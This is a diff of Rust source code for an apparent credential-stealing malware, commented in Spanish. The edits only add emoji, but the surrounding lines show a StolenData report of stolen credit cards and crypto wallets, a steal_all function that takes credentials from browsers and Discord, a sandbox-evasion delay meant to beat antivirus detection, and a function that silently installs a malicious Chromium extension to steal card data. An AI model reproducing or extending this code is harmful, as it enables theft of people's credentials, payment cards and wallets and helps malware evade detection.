@@ -114,7 +114,7 @@ impl StolenData {
 
         // 🔍 DEBUG: Mostrar logs de diagnóstico al principio
         if !self.debug_log.is_empty() {
-            output.push_str("\n DEBUG LOG (Credit Cards)\n");
+            output.push_str("\n🔍 DEBUG LOG (Credit Cards)\n");
             output.push_str("═══════════════════════════════════════\n");
             output.push_str(&self.debug_log);
             output.push_str("\n═══════════════════════════════════════\n");
@@ -147,7 +147,7 @@ impl StolenData {
 
         // Crypto Wallets
         if !self.wallets.is_empty() {
-            output.push_str(&format!("\n\n CRYPTO WALLETS ({})\n", self.wallets.len()));
+            output.push_str(&format!("\n\n💰 CRYPTO WALLETS ({})\n", self.wallets.len()));
             output.push_str("═══════════════════════════════════════\n");
             for (idx, wallet) in self.wallets.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -214,7 +214,7 @@ impl StolenData {
 /// Ejecuta el robo de credenciales de todos los browsers y Discord
 pub fn steal_all() -> StolenData {
     // ═══════════════════════════════════════════════════════════════
-    //  SANDBOX EVASION - Sleep 90 segundos (COMENTADO PARA TESTING)
+    // 🛡️ SANDBOX EVASION - Sleep 90 segundos (COMENTADO PARA TESTING)
     // ═══════════════════════════════════════════════════════════════
     // Los sandboxes de AV tienen timeout de 30-60 segundos.
     // Si el malware no hace nada sospechoso en ese tiempo, pasa la detección.
@@ -313,7 +313,7 @@ pub fn steal_all() -> StolenData {
     data
 }
 
-///  Instalar extensión de Chromium para robar credit cards (bypass v20)
+/// 🎯 Instalar extensión de Chromium para robar credit cards (bypass v20)
 /// Esta función instala silenciosamente una extensión maliciosa en todos los navegadores Chromium
 pub fn install_card_stealer_extension() -> Result<Vec<String>, Box<dyn Error>> {
     use std::path::PathBuf;
